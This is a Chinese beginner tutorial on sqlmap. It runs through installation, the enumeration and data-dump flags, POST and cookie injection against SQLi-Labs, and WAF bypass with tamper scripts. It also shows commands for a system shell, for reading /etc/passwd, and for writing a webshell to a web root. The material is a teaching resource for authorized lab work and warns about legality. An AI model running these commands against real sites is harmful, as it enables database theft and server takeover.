# Day 18：SQL注入神器sqlmap使用指南

> **🎯 靶场实战** | 难度：⭐⭐ | 预计学习：65 分钟

---

# 第18章 SQL注入神器sqlmap使用指南 🎯

> 第18章 | 难度：⭐⭐ | 阅读时间：80分钟

---

## 📖 开篇引入：手酸了吗？神器来了！💪

哈喽，各位小伙伴们！欢迎来到第18章的学习！🎉

前面几章我们在SQLi-Labs里一路闯关，从Less1打到Less75，是不是感觉手都敲酸了？😅 手工注入虽然爽，能让你彻底理解原理，但每一步都要自己写payload、自己猜字段、自己跑数据，遇到盲注更是得等半天，简直就是"体力活"啊！

这就好比什么呢？给你举个生活小例子 🏠

想象一下：
- 你搬家的时候，一大堆箱子要从一楼搬到六楼
- 你一个一个扛上去，累得满头大汗、气喘吁吁
- 这时候你邻居过来问你："兄弟，你咋不用电梯呢？"

哈哈，是不是瞬间感觉自己像个傻子？🤣

手工注入就像"爬楼梯搬箱子"，虽然能锻炼身体、理解每一步的原理，但效率实在太低了。而今天我们要介绍的这个神器——**sqlmap**，就是Web安全界的"电梯"！有了它，你只需要按个按钮，它就自动帮你把所有"箱子"都搬上去了！

### 先打个预防针 💉

不过啊，在正式开始之前，我必须先跟大家说几句掏心窝子的话：

> **工具是把双刃剑，既能帮你效率翻倍，也能让你变成"脚本小子"！**

什么是"脚本小子"？就是那种只会用工具瞎扫、根本不知道原理的人。就像你有了电梯，但你连楼梯怎么走都不知道，哪天电梯坏了，你就彻底傻眼了。😵

所以我的建议是：
- ✅ **先学手工，再用工具** —— 手工是"内功"，工具是"招式"，内功扎实了，招式才能发挥威力
- ✅ **知其然，更要知其所以然** —— 用工具跑出来结果，要能想明白"为什么是这样"
- ✅ **工具只是辅助，思路才是核心** —— 真正的高手，手里有没有工具都一样厉害

好了，预防针打完了，接下来我们正式开始今天的内容！坐稳扶好，我们发车了！🚗

---

## 18.1 sqlmap是什么？为什么要学它？🤔

### 18.1.1 大白话解释sqlmap 💬

sqlmap，听名字就知道，sql + map，就是"SQL注入地图"嘛！不对不对，其实它的全称应该是 **SQL Injection Toolkit**，一个专门用来做SQL注入的自动化工具。

用大白话讲：
> **你给sqlmap一个URL，它自动帮你测有没有注入、是什么类型的注入、数据库是什么、有哪些表、有哪些字段，甚至能直接把整个数据库的数据都给你"扒"下来！**

是不是感觉很牛掰？😎

再给你打个比方：
- 手工注入 = 你拿着洛阳铲，一个坑一个坑地挖，挖着挖着可能就挖到宝贝了
- sqlmap = 你开着一台全自动挖掘机，设定好范围，它自己就突突突地挖，挖着宝贝还主动给你送过来

这效率差了可不是一星半点啊！🚜

### 18.1.2 sqlmap有多牛？🐂

sqlmap可以说是SQL注入界的"扛把子"，几乎是每个Web安全从业者的必备工具。它牛在哪里呢？我给你列几条：

**1️⃣ 支持的数据库多到离谱 🗄️**

MySQL、SQL Server、Oracle、PostgreSQL、SQLite、Access、MongoDB... 基本上你能叫得出名字的数据库，它都支持！就像一个万能钥匙，什么锁都能捅两下。🔑

**2️⃣ 支持的注入类型全覆盖 🎭**

联合查询注入、报错注入、布尔盲注、时间盲注、堆叠注入、二阶注入... 只要是你能想到的注入类型，它都能搞定！

**3️⃣ 功能强大到没朋友 💪**

除了最基本的"脱库"（导出数据），它还能：
- 读取服务器上的任意文件 📂
- 往服务器上写文件 ✍️
- 直接拿到系统Shell（就是直接控制服务器）🖥️
- 执行系统命令...

简直就是"注入一条龙服务"啊！🐉

**4️⃣ 开源免费，人人可用 🆓**

sqlmap是完全开源的，基于Python开发，你可以免费下载使用，甚至可以自己修改源代码。

### 18.1.3 既然手工这么累，为啥不直接学工具？🤷‍♂️

这是个好问题！我相信很多新手心里都有这个疑问："既然工具这么好用，我为啥还要辛辛苦苦学手工注入？直接学sqlmap不就行了？"

问得好！我给你讲个真实的故事 📖

> 我以前认识一个朋友，学安全的时候直接跳过了手工注入，一上来就玩sqlmap。
> 他天天拿着工具扫各种网站，感觉自己牛得不行，逢人就说"我又拿下了什么什么站"。
> 结果有一次参加CTF比赛，遇到一个注入题，有WAF（Web应用防火墙），sqlmap直接被拦了。
> 他当场就懵了，因为他根本不知道注入的原理是什么，更不知道怎么绕过WAF。
> 最后别人手工注入都做出来了，他盯着屏幕上的"被拦截"三个字，一脸懵逼。

这个故事告诉我们什么道理？

**工具是死的，人是活的！** 🌱

- 手工注入是"道"，是原理，是底层逻辑
- sqlmap是"术"，是工具，是提高效率的手段

只学工具不学原理，你就永远只是个"脚本小子"，遇到点特殊情况就抓瞎。而真正的高手，是先把原理吃透了，再用工具来节省时间。

再打个比方：
- 学手工 = 学数学的时候，你先学会了加减乘除的原理，会列竖式计算
- 用工具 = 你有了计算器，算得又快又准

但是如果你连加减乘除的原理都不懂，给你个计算器你也不知道该按什么键啊！是不是这个理？🧮

所以啊，**先手工，后工具**，这个顺序一定不能乱！

---

## 18.2 sqlmap怎么安装？🛠️

好了，道理讲完了，接下来我们干点正事——把sqlmap装起来！

### 18.2.1 Windows下安装（需要Python环境）🐍

sqlmap是用Python写的，所以你得先有Python环境。就像你要玩游戏，得先装个游戏平台一样。🎮

**第一步：安装Python**

如果你还没装Python，赶紧去装一个。步骤很简单：
1. 去Python官网（https://www.python.org/）下载安装包
2. 双击运行，**一定要勾选"Add Python to PATH"**（把Python加到环境变量里）
3. 一路"Next"点到底就完事了

安装完之后，打开CMD（命令提示符），输入：
```
python --version
```
如果能看到版本号，说明装好了。✅

**第二步：下载sqlmap**

sqlmap可以直接从GitHub上下载，有两种方式：

方式一：直接下载压缩包（简单粗暴）
1. 打开 https://github.com/sqlmapproject/sqlmap
2. 点击绿色的"Code"按钮 → 选"Download ZIP"
3. 下载完解压到一个你找得到的地方，比如 `D:\sqlmap`

方式二：用Git克隆（推荐，方便更新）
```
git clone https://github.com/sqlmapproject/sqlmap.git
```

**第三步：验证安装**

打开CMD，进入sqlmap所在的目录：
```
cd D:\sqlmap
```

然后输入：
```
python sqlmap.py -h
```

如果哗啦啦出来一大推帮助信息，说明安装成功了！🎉

> 💡 **小提示**：每次用都要进目录、输python sqlmap.py是不是有点麻烦？你可以把sqlmap的路径加到系统环境变量里，这样在任何目录下都能直接用。不过新手刚开始就算了，麻烦点就麻烦点，先跑起来再说。

### 18.2.2 Kali Linux自带，开箱即用 🐉

如果你用的是Kali Linux（做安全的基本上都用这个系统），那恭喜你，**sqlmap是预装的！** 你啥也不用干，打开终端直接用就行。

直接输入：
```
sqlmap -h
```

就能看到帮助信息了，是不是很方便？😎

> 💡 **小知识**：Kali Linux是一个专门用来做渗透测试的Linux发行版，里面预装了几百个安全工具，sqlmap只是其中之一。如果你打算长期学安全，建议装个Kali，省得自己一个个装工具。

### 18.2.3 sqlmap长啥样？👀

很多新手第一次用sqlmap，看到满屏幕的英文就头大。别慌，我带你认识一下它的"长相"。

当你输入 `sqlmap -h` 的时候，你会看到类似这样的东西：

```
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.7.2#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

Usage: python sqlmap.py [options]

Options:
  -h, --help            Show basic help message and exit
  -hh                   Show advanced help message and exit
  --version             Show program's version number and exit
  ...（后面还有一大堆）
```

最上面那个用字符拼出来的图案，就是sqlmap的"logo"，是不是还挺酷的？那个小笑脸 🤡 每次看到都觉得很喜感。

下面就是各种参数选项了，看着多，其实常用的就那么几个，我们后面会慢慢讲。

---

## 18.3 sqlmap最基本的使用：测注入点 🧪

好了，工具装好了，接下来我们来试试水！先从最简单的开始——**测试一个URL有没有注入漏洞**。

### 18.3.1 最简单的命令 📝

sqlmap最最最基本的用法，就是 `-u` 参数加一个URL：

```bash
sqlmap -u "http://xxx/?id=1"
```

就这么简单！你把要测试的URL给它，它就会自动帮你检测有没有注入漏洞。

> ⚠️ **注意**：URL最好用引号括起来，特别是URL里有特殊字符（比如`&`）的时候，不然可能会出问题。养成加引号的好习惯！

### 18.3.2 它到底在干嘛？🤔

你输入命令回车之后，就会看到sqlmap开始啪啦啪啦地输出信息。很多新手看到满屏滚动的英文就慌了，不知道它在干嘛。

别慌，我给你翻译一下它的"心路历程"：

1. **"让我先看看这个网站长啥样"** —— 它先访问一下目标URL，看看能不能打开
2. **"嗯，有个参数叫id，我来试试能不能注入"** —— 它找到URL里的参数（比如`id=1`）
3. **"先加个单引号试试？"** —— 它往参数值后面加个`'`，看看会不会报错
4. **"哟，报错了，可能有戏！"** —— 如果报错了，说明可能有注入
5. **"再试试and 1=1和and 1=2？"** —— 它继续测试，确认是不是真的有注入
6. **"确认了，这是个注入点！"** —— 如果测试通过，它就会告诉你有注入

整个过程，其实就是把我们手工注入时做的那些事，自动做了一遍。是不是很智能？🤖

### 18.3.3 结果怎么看？👀

sqlmap跑了一会儿之后，会告诉你结果。那怎么看有没有注入呢？

**找关键词：vulnerable** 🔍

只要你在输出里看到类似这样的话：
```
[INFO] the URL is vulnerable to SQL injection
```
或者：
```
[*] starting @ 10:30:23 /2026-06-25/

[10:30:25] [INFO] testing connection to the target URL
[10:30:26] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:30:27] [INFO] testing if the target URL content is stable
[10:30:28] [INFO] target URL content is stable
[10:30:29] [INFO] testing if GET parameter 'id' is dynamic
[10:30:30] [WARNING] GET parameter 'id' appears to be dynamic
[10:30:31] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable
[10:30:32] [INFO] testing for SQL injection on GET parameter 'id'
[10:30:33] [INFO] confirming 'AND boolean-based blind - WHERE or HAVING clause'
[10:30:34] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
```

看到 **injectable**（可注入的）或者 **vulnerable**（有漏洞的）这些词，就说明**有注入漏洞**！✅

相反，如果它说：
```
[WARNING] no SQL injection detected
```
那就是没测出来注入（也可能是它没测出来，不代表一定没有）。

### 18.3.4 交互提示怎么办？🙋‍♂️

在跑的过程中，sqlmap可能会时不时停下来问你问题，让你选Y/N。比如：
```
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
```

翻译一下："看起来后端数据库是MySQL，你想跳过其他数据库的测试吗？"

对于新手来说，**一律按回车就行**（默认选项是大写的那个，比如Y就是默认）。sqlmap的默认选项一般都是最合理的。

如果你嫌麻烦，不想每次都按回车，可以加个 `--batch` 参数，它就自动帮你选了，我们后面会讲。

---

## 18.4 sqlmap常用参数详解 ⚙️

sqlmap的参数非常多，多到能让你看到眼花。但是别怕，常用的其实就那么十几个，我给你一个个讲明白。

### 18.4.1 基础参数（最常用）🌟

#### 1. `--dbs：爆所有数据库名 🏛️

dbs就是databases的缩写。加上这个参数，sqlmap就会把目标服务器上**所有的数据库名**都给你列出来。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --dbs
```

就好比你去图书馆，本来只想找一本书，结果管理员把整个图书馆的所有阅览室名单都给你了。📚

#### 2. `-D：指定数据库 🎯

D就是Database的意思。当你知道有哪些数据库之后，想对其中某一个数据库操作，就用`-D`指定它。

用法：
```bash
sqlmap -u "http://xxx/?id=1" -D security --tables
```

意思就是："我要操作security这个数据库，给我看看里面有什么表。"

#### 3. `--tables：爆表名 📋

tables就是表的意思。加上它，sqlmap会把指定数据库里的**所有表名**列出来。

注意：`--tables`通常和`-D`一起用，不然它不知道你要爆表。

用法：
```bash
sqlmap -u "http://xxx/?id=1" -D security --tables
```

就好比你进了security这个阅览室，想知道这个阅览室里有哪些书架。🗄️

#### 4. `-T：指定表名 📊

T就是Table的意思。指定你想操作哪个表。

用法：
```bash
sqlmap -u "http://xxx/?id=1" -D security -T users --columns
```

意思就是："我要看users这张表里面的字段。"

#### 5. `--columns：爆字段名 📝

columns就是列（字段）的意思。加上它，sqlmap会把指定表里的**所有字段名**都列出来。

用法：
```bash
sqlmap -u "http://xxx/?id=1" -D security -T users --columns
```

就好比你找到了users这个书架，想知道书架上每个箱子里都装了些什么东西。📦

#### 6. `-C：指定字段 🎯

C就是Column的意思。如果你只想看某几个字段，就用`-C`指定。

用法：
```bash
sqlmap -u "http://xxx/?id=1" -D security -T users -C username,password --dump
```

意思就是："我只要username和password这两个字段的数据。"

#### 7. `--dump：导出数据 💾

dump这个词很形象，就是"倾倒、倾泻"的意思。加上这个参数，sqlmap就会把数据哗啦啦全给你导出来。

用法：
```bash
# 导出整张表的数据
sqlmap -u "http://xxx/?id=1" -D security -T users --dump

# 只导出指定字段
sqlmap -u "http://xxx/?id=1" -D security -T users -C username,password --dump
```

这就是大家常说的**"脱库"**了！把整个数据库的数据都扒下来。😈

> ⚠️ **郑重提醒**：脱库是违法行为！只能在授权的测试环境中使用！别拿着工具去瞎搞，不然警察叔叔会请你喝茶的！☕👮

### 18.4.2 便利参数（让你少敲几下键盘）⌨️

#### 8. `--batch：自动确认 ✅

前面说了，sqlmap跑的时候经常会停下来问你问题，让你选Y/N。如果你懒得一个个按回车，就加个`--batch`，它会自动用默认选项，全程不用你管。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --dbs --batch
```

就好比你请了个秘书，帮你处理所有琐碎的选择，你只需要看结果就行。🤵

#### 9. `--random-agent：随机User-Agent 🎭

User-Agent是什么？就是浏览器的"身份证"，告诉网站你用的是什么浏览器、什么操作系统。

默认情况下，sqlmap的User-Agent里会有"sqlmap"字样，很容易被WAF检测到。加了`--random-agent`，它就会随机用一个真实浏览器的User-Agent，伪装得更像正常人。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --dbs --random-agent
```

就好比你去干"坏事"之前，先乔装打扮一下，戴个墨镜贴个胡子，不让人认出来。🕶️🥸

### 18.4.3 测试等级参数（测多深、测多全）📏

#### 10. `--level：测试等级 🎚️

level就是等级的意思，取值范围是**1到5**，默认是1。

- level 1：最基础的测试，只测最常见的注入点（GET、POST参数）
- level 2：会测Cookie参数
- level 3：会测HTTP头里的参数（比如User-Agent、Referer）
- level 4-5：更全面、更深入的测试，payload更多

等级越高，测试得越全面，但花费的时间也越长。

一般情况下，默认的level 1就够用了。如果level 1测不出来，可以试试调高一点。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --level 3
```

就好比你去体检：
- level 1 = 基础体检，查查身高体重血压
- level 5 = 全身检查，从头到脚给你查个遍，当然也更贵更费时间🏥

#### 11. `--risk：风险等级 ⚠️

risk是风险的意思，取值范围是**1到3**，默认是1。

- risk 1：最安全，不会对数据造成破坏
- risk 2：会测试一些可能有风险的payload（比如基于时间的盲注）
- risk 3：会测试更危险的payload（比如OR类型的注入，可能会改数据）

简单说就是：risk越高，越容易测出注入，但也越可能把目标网站搞挂。

新手建议就用默认的risk 1，安全第一！

用法：
```bash
sqlmap -u "http://xxx/?id=1" --risk 2
```

### 18.4.4 代理与抓包相关参数 🌐

#### 12. `--proxy：走代理 🕵️

如果你想让sqlmap的流量走代理（比如配合BurpSuite抓包看看），就用这个参数。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --proxy http://127.0.0.1:8080
```

这样sqlmap的所有请求都会经过Burp，你就能在Burp里看到它发了什么payload。调试的时候很有用。

#### 13. `-r：从文件加载HTTP请求 📄

r就是request的意思。有些时候注入点在POST请求里，或者请求头很复杂，直接用`-u`不好使。这时候你可以用Burp把请求抓下来，保存成一个文件，然后用`-r`加载这个文件。

用法：
```bash
sqlmap -r request.txt
```

这个方法超级实用，特别是对付POST注入、Cookie注入的时候，我们后面会详细讲。

### 18.4.5 其他常用参数 📌

#### 14. `--cookie：指定Cookie 🍪

如果网站需要登录才能访问，你就得把Cookie带上，不然sqlmap连页面都打不开。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --cookie "PHPSESSID=abc123; user=admin"
```

Cookie怎么来？用浏览器的开发者工具，或者用Burp抓包都能看到。

#### 15. `--data：POST数据 📤

如果是POST注入，你可以用`--data`参数把POST的数据传进去。

用法：
```bash
sqlmap -u "http://xxx/login.php" --data "username=admin&password=123"
```

这样sqlmap就会测试POST数据里的参数有没有注入。

---

## 18.5 实战演示：用SQLi-Labs的Less1练手 🎮

讲了这么多理论，是不是手痒痒了？来，我们拿SQLi-Labs的Less1来实战演练一下！

> 前提：你已经搭好了SQLi-Labs，并且Less1能正常访问。如果还没搭，回去看第13章！👀

### 第一步：测有没有注入 🧪

首先，我们先测一下Less1的URL有没有注入。

打开你的CMD或者终端，输入命令：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --batch
```

> 如果你是Windows，记得用 `python sqlmap.py` 开头，并且先cd到sqlmap目录。我后面就都写`sqlmap`了，大家根据自己的情况调整。

**然后你会看到什么？👀**

先是sqlmap的logo，然后它开始测试：

```
[*] starting @ 10:30:00 /2026-06-25/

[10:30:01] [INFO] resuming back-end DBMS 'mysql' 
[10:30:02] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 7487=7487-- eKth

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID)
    Payload: id=1' AND SELECT ROW_COUNT()

    Type: UNION query
    Title: Generic UNION query (NULL) - 3 columns
    Payload: id=-1' UNION ALL SELECT CONCAT(0x7178767071...
---
[10:30:10] [INFO] the back-end DBMS is MySQL
web server operating system: Windows
web application technology: PHP, Apache
back-end DBMS: MySQL >= 5.6
```

哇，结果出来了！是不是很激动？🎉

我给你翻译一下结果：
- **Parameter: id (GET)** → 注入参数是id，GET型的
- **boolean-based blind** → 布尔盲注，可行
- **error-based** → 报错注入，可行
- **UNION query** → 联合查询注入，可行（有3个字段）
- **back-end DBMS is MySQL** → 后端数据库是MySQL
- **web server operating system: Windows** → 服务器操作系统是Windows

我的妈呀，它把啥都给你测出来了！手工注入你得一步步试，它几秒钟就全搞定了！😲

### 第二步：爆数据库 🏛️

确认有注入了，接下来我们看看有哪些数据库。加个 `--dbs` 参数：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" --dbs --batch
```

**结果大概是这样的：**

```
[*] starting @ 10:35:00 /2026-06-25/

[10:35:05] [INFO] fetching database names
available databases [7]:
[*] challenges
[*] dvwa
[*] information_schema
[*] mysql
[*] performance_schema
[*] security
[*] test
```

看到没！所有数据库名都列出来了！一共有7个数据库。其中 `security` 就是SQLi-Labs用来存用户数据的库，`information_schema`、`mysql` 这些是MySQL系统自带的。

### 第三步：选security库，爆表名 📋

我们就拿`security`这个库来开刀。用`-D security --tables`来爆表：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security --tables --batch
```

**结果：**

```
[*] starting @ 10:40:00 /2026-06-25/

[10:40:05] [INFO] fetching tables for database: 'security'
Database: security
[4 tables]
+----------+
| emails   |
| referers |
| uagents  |
| users    |
+----------+
```

看到了吗？security库里面有4张表：`emails`、`referers`、`uagents`、`users`。

其中`users`表一听名字就知道是存用户的，用户名密码肯定在里面！😏

### 第四步：选users表，爆字段 📝

接下来我们看看users表里有哪些字段。用`-T users --columns`：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --columns --batch
```

**结果：**

```
[*] starting @ 10:45:00 /2026-06-25/

[10:45:05] [INFO] fetching columns for table 'users' in database 'security'
Database: security
Table: users
[3 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | int(3)      |
| password | varchar(20) |
| username | varchar(20) |
+----------+-------------+
```

完美！users表里有3个字段：`id`、`username`、`password`。
- id是整数类型
- username和password都是字符串，最长20个字符

和我们手工注入得到的结果一模一样！但是速度快多了有木有！🚀

### 第五步：导出数据（脱库）💾

终于到了最激动人心的一步——把数据导出来！加`--dump`参数：

```bash
sqlmap -u "http://127.0.0.1/sqli-labs/Less-1/?id=1" -D security -T users --dump --batch
```

**结果：**

```
[*] starting @ 10:50:00 /2026-06-25/

[10:50:05] [INFO] fetching entries for table 'users' in database 'security'
Database: security
Table: users
[13 entries]
+----+------------+----------+
| id | username   | password |
+----+------------+----------+
| 1  | Dumb       | Dumb     |
| 2  | Angelina   | I-kill-you |
| 3  | Dummy      | p@ssword  |
| 4  | secure     | crappy    |
| 5  | stupid     | stupidity |
| 6  | superman   | genious   |
| 7  | batman     | mob!le    |
| 8  | admin      | admin     |
| 9  | admin1     | admin1    |
| 10 | admin2     | admin2    |
| 11 | admin3     | admin3    |
| 12 | dhakkan    | dumbo     |
| 13 | admin4     | admin4    |
+----+------------+----------+
```

🎉🎉🎉 搞定！所有用户的用户名和密码都出来了！

是不是感觉很爽？手工注入你得写union查询、得自己想payload，sqlmap一键搞定！

> 💡 **小提示**：sqlmap会把跑出来的结果自动保存到一个文件里，一般在`sqlmap/output/`目录下，以目标域名命名的文件夹里。下次再跑同一个目标，它还会从上次的进度继续，不用重新跑，很人性化！

---

## 18.6 POST注入怎么弄？📤

前面我们讲的都是GET型注入，就是参数在URL里的那种。但实战中，很多注入是POST型的，比如登录框、搜索框，参数在请求体里。

那POST注入用sqlmap怎么搞呢？有两种常用方法。

### 方法一：用`--data`参数 📝

如果POST的数据不复杂，直接用`--data`参数把POST数据传进去就行。

举个例子，假设一个登录页面：
- URL：`http://xxx/login.php`
- POST数据：`username=admin&password=123`

那sqlmap命令就是：

```bash
sqlmap -u "http://xxx/login.php" --data "username=admin&password=123" --batch
```

sqlmap会自动测试POST数据里的每个参数（这里就是username和password），看看哪个有注入。

就这么简单！和GET型的区别就是把参数从URL里挪到`--data`里了。

### 方法二：用`-r`加载请求文件（推荐）🌟

如果请求比较复杂（比如有很多请求头、Cookie什么的），或者你懒得手敲POST数据，那这个方法就很方便了。

**步骤如下：**

**1. 用Burp抓包** 📦

打开BurpSuite，开启代理，然后在浏览器里提交请求（比如点登录按钮），Burp就会抓到这个请求。

**2. 把请求保存成文件** 💾

在Burp里，右键点击抓到的请求 → 选"Copy to file"（或者直接全选复制粘贴），保存成一个文本文件，比如`request.txt`。

文件内容大概长这样：
```
POST /sqli-labs/Less-11/ HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Cookie: PHPSESSID=abc123

uname=admin&passwd=123&submit=Submit
```

**3. 用`-r`参数加载文件** 🚀

```bash
sqlmap -r request.txt --batch
```

搞定！sqlmap会自动解析这个请求，测试里面的所有参数。

这个方法的好处是：
- ✅ 不用手动输入一堆参数
- ✅ 完整保留请求头、Cookie等信息
- ✅ 什么类型的请求都能用（GET、POST、PUT...）

**强烈推荐新手用这种方法，不容易出错！** 👍

### 实战：拿Less-11试试手 🎯

SQLi-Labs的Less-11就是POST注入的，我们来试试看。

**步骤1：** 先在浏览器里打开Less-11，随便输入点东西点登录，用Burp抓包。

**步骤2：** 把请求保存成`less11.txt`。

**步骤3：** 跑sqlmap：

```bash
sqlmap -r less11.txt --batch
```

然后你就会看到sqlmap哗哗地跑，很快就告诉你uname参数有注入！

后面爆库爆表的步骤和GET注入一模一样，我就不重复了。大家自己去试试！😉

---

## 18.7 Cookie注入怎么弄？🍪

有些时候，注入点不在GET参数里，也不在POST数据里，而在Cookie里。这怎么办呢？

很简单，有两种方法：

### 方法一：用`--cookie`参数 📝

直接用`--cookie`把Cookie传进去，sqlmap就会测试Cookie里的参数。

用法：
```bash
sqlmap -u "http://xxx/page.php" --cookie "id=1" --level 2 --batch
```

> ⚠️ **注意**：默认情况下（level=1），sqlmap是**不会**测试Cookie的！你得把level调到**2或以上**，它才会去测Cookie参数。

为什么呢？因为Cookie注入相对少见，默认不测是为了节省时间。

### 方法二：用`-r`加载请求文件（还是推荐）🌟

对，又是这个方法！只要请求文件里有Cookie，sqlmap就能识别到。再加上`--level 2`就行。

```bash
sqlmap -r request.txt --level 2 --batch
```

还是那句话：抓包保存文件，一键搞定，简单粗暴！💪

---

## 18.8 sqlmap进阶功能（简单了解即可）🚀

sqlmap的功能远不止"脱库"这么简单，它还有很多强大的进阶功能。新手朋友可以先了解一下，等以后水平上来了再深入研究。

### 18.8.1 `--os-shell：拿系统Shell 🖥️

这个功能可以说是sqlmap的"大杀器"了！如果数据库权限够高（比如root、sa），sqlmap可以直接给你一个**系统命令行**，让你可以执行任意系统命令——相当于直接控制了服务器！

用法：
```bash
sqlmap -u "http://xxx/?id=1" --os-shell
```

执行之后，你就会得到一个交互式的Shell，想输什么命令就输什么。

是不是很恐怖？😱 所以说SQL注入的危害真的很大！

### 18.8.2 `--sql-shell：SQL交互Shell 💬

这个是SQL层面的Shell，你可以直接执行SQL语句，就像在MySQL命令行里一样。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --sql-shell
```

适合想手动执行一些特殊SQL语句的时候用。

### 18.8.3 `--file-read：读取服务器文件 📂

可以读取服务器上的任意文件（前提是权限够）。

比如读取服务器的`/etc/passwd`文件：
```bash
sqlmap -u "http://xxx/?id=1" --file-read /etc/passwd
```

Windows的话就是读`C:\\Windows\\System32\\drivers\\etc\\hosts`之类的。

### 18.8.4 `--file-write：往服务器写文件 ✍️

不仅能读，还能写！你可以把本地的文件上传到服务器上去。

比如上传一个一句话木马：
```bash
sqlmap -u "http://xxx/?id=1" --file-write ./shell.php --file-dest /var/www/html/shell.php
```

> ⚠️ **再次提醒**：这些功能都非常强大，但也非常危险！只能在授权的测试环境中使用！未经授权入侵他人计算机是刑事犯罪！

---

## 18.9 使用sqlmap的注意事项 ⚠️

工具虽好，但不能乱用。在使用sqlmap的时候，有几点一定要注意：

### 18.9.1 先手工确认，再用工具 🎯

很多新手拿到一个网站，不管三七二十一，扔给sqlmap就开始扫。这是非常不好的习惯！

正确的做法应该是：
1. **先手工测一下**，看看有没有注入点，大概是什么类型
2. **确认有注入了**，再用sqlmap去跑，提高效率

为什么要这样？
- 盲目地扫，既浪费时间，又容易触发WAF/IPS的告警
- 手工测过之后，你心里有数，知道该用什么参数，效率更高
- 不然你就是个只会按回车的"工具人"，遇到问题根本不知道怎么回事

### 18.9.2 不要乱扫网站！违法！🚔

这个我必须再强调一遍：
> **未经授权，对他人网站进行SQL注入测试是违法行为！**

《刑法》第二百八十五条、第二百八十六条了解一下？非法侵入计算机信息系统罪、破坏计算机信息系统罪，都是要坐牢的！🏢👮

我们学安全是为了**保护**网络安全，不是为了搞破坏。只能在自己搭建的靶场、或者有书面授权的情况下进行测试！

### 18.9.3 实战中注意绕过WAF 🛡️

真实的网站很多都有WAF（Web应用防火墙），sqlmap的默认payload很容易被拦。这时候怎么办？

sqlmap有个 `--tamper` 参数，可以用来加载绕过脚本。tamper脚本会对payload进行各种编码、变形，来绕过WAF的检测。

用法：
```bash
sqlmap -u "http://xxx/?id=1" --tamper space2comment
```

常用的tamper脚本有：
- `space2comment`：把空格替换成注释`/**/`
- `base64encode`：base64编码
- `charencode`：URL编码
- `between`：用between代替等号
- ...还有很多很多

tamper脚本都在sqlmap的`tamper/`目录下，大家可以自己去看看。

不过绕过WAF是个技术活，tamper也不是万能的。很多时候还是得靠手工注入、自己构造payload。这又回到了我们开头说的——**手工基础才是王道！** 💪

### 18.9.4 工具只是工具，思路才是最重要的 🧠

最后再跟大家说句掏心窝子的话：

> **工具永远只是辅助，真正决定你水平的，是你的思路和对原理的理解。**

sqlmap再牛，也只是个工具。真正的高手：
- 知道什么时候该用工具，什么时候该手工
- 知道工具为什么能跑出来，跑不出来的时候知道问题出在哪
- 能根据不同的场景，灵活调整策略

所以啊，别沉迷于工具的强大而忽略了基础。把原理吃透了，工具才能发挥最大的威力。🌱

---

## 18.10 新手常见问题FAQ ❓

### Q1：sqlmap跑不出来怎么办？😫

A：跑不出来的原因有很多，常见的有：

1. **注入点判断错了** —— 可能那个参数根本就没有注入，换个参数试试
2. **有WAF/IPS拦截** —— 看看是不是返回了"403 Forbidden"或者"您的请求存在安全威胁"之类的，有的话就是被拦了，得想办法绕过
3. **参数类型不对** —— 比如是POST的你用GET测，或者参数在Cookie里你没测到
4. **level/risk太低** —— 试试调高level，比如`--level 3`
5. **网站响应太慢** —— 可以加个`--delay`参数，慢点发请求

跑不出来很正常，别灰心，多分析分析原因，慢慢就有经验了。

### Q2：为什么一定要先学手工再用工具？🤷‍♂️

A：这个问题我前面已经讲了很多了，但还是想再强调一遍：

- **知其然，更要知其所以然** —— 你只会用工具跑，不知道为什么能跑出来，那跑出来又有什么意义呢？
- **遇到问题不会排查** —— 工具跑不出来的时候，你根本不知道是哪里的问题，只能干瞪眼
- **容易变成"脚本小子"** —— 只会用现成的工具，没有自己的思考，水平永远上不去
- **CTF比赛用不上** —— 稍微有点水平的CTF题，工具都是直接跑不出来的，得靠手工

一句话：**手工是内功，工具是招式。内功深厚，招式才能发挥威力；内功不行，再厉害的招式也只是花架子。** 🥋

### Q3：sqlmap能测所有注入吗？🤔

A：不能！sqlmap虽然强大，但也不是万能的。

比如：
- **二阶注入** —— sqlmap很难测出来，因为注入的payload是在另一个页面触发的
- **非常见的注入点** —— 比如注入点在文件名里、在一些奇葩的位置
- **逻辑复杂的注入** —— 需要特定的操作步骤才能触发的注入
- **WAF防护严格的** —— 各种WAF规则拦着，工具的payload直接被毙了
- **JSON/XML格式的注入** —— 参数在JSON或XML里，需要特殊处理

所以啊，别以为有了sqlmap就天下无敌了。很多场景还是得靠手工、靠脑子。🧠

---

## 📚 本章总结 + 下章预告 🎉

### 本章总结 ✨

这一章我们学习了SQL注入神器——sqlmap的使用。来回顾一下重点：

1. **sqlmap是什么** —— 自动化SQL注入工具，能帮你快速检测和利用SQL注入漏洞
2. **安装方法** —— Windows需要Python环境，Kali自带
3. **基本使用** —— `sqlmap -u "URL"` 测试注入点
4. **常用参数**：
   - `--dbs` 爆数据库
   - `-D` 指定数据库
   - `--tables` 爆表
